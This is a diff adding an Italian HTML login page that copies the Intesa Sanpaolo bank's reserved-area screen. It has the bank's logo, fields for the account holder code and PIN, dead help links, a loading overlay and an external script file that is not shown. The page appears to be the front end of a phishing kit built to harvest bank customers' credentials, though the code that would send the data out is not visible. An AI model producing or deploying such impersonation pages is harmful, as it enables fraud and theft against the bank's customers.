@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Accesso Area Riservata</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+    <main class="form-container" role="main">
+        <img src="./images/intesa-sanpaolo-1.png" alt="logo" class="logo">
+
+
+        <form id="loginForm" aria-label="Modulo di accesso all'area riservata">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon-lucchetto" viewBox="0 0 24 24" fill="white" width="20"
+                height="20" aria-hidden="true">
+                <path
+                    d="M12 1a5 5 0 00-5 5v4H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 5a3 3 0 016 0v4H9V6zm9 6v9H6v-9h12z" />
+            </svg>
+            <label for="codice">Codice Titolare</label>
+            <input type="text" id="codice" name="codice" placeholder="Codice Titolare" required
+                aria-label="Codice Titolare" />
+
+            <label for="pin">PIN</label>
+            <input type="password" id="pin" name="pin" placeholder="PIN" required aria-label="PIN personale" />
+
+            <button type="submit" aria-label="Accedi all'area personale">Accedi</button>
+        </form>
+
+        <div class="links-container">
+            <a href="#" class="link" aria-label="Hai dimenticato il PIN?">Hai dimenticato il PIN?</a>
+            <a href="#" class="link" aria-label="Hai dimenticato il codice titolare?">Hai dimenticato il codice
+                titolare?</a>
+            <a href="#" class="link" aria-label="Registrati al primo accesso">Primo accesso?</a>
+        </div>
+
+        <div class="loading-overlay" id="loadingOverlay" role="alert" aria-live="polite">
+            <div class="spinner" aria-hidden="true"></div>
+            <div class="loading-text">Caricamento in corso...</div>
+        </div>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
